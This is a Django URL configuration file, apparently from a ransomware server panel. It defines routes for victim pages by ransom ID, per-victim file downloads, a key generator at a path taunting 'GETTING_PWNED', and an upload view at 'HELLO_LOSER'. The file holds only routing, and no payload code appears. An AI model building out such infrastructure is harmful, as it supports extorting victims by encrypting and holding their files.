from django.urls import path
from . import views

app_name = 'website'
urlpatterns=[
    path("",views.index_view,name="index"),
    path('<int:ransom_id>/ransomvictim/', views.ransom_id, name='ransom_id'),
    path('<int:victim_id>/<str:file>/downloadfile/', views.downloadfile, name='downloadfile'),
    path('¥¥¥GETTING_PWNED¥¥¥/',views.keys_generator_view, name='keys'),   
    path('¥¥¥HELLO_LOSER¥¥¥/',views.upload_files_view, name='file_upload'),
]
